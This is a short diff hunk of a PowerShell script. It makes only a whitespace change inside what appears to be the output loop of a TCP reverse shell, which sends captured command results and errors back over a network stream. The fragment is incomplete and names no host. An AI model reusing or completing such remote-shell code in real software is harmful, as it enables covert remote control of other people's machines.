@@ -25,7 +25,7 @@ $stream.Write($sendbytes,0,$sendbytes.Length)
             $error.clear()
             $sendback2 = $sendback2 + $x
 
-            
+           
             $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
             $stream.Write($sendbyte,0,$sendbyte.Length)
             $stream.Flush()  
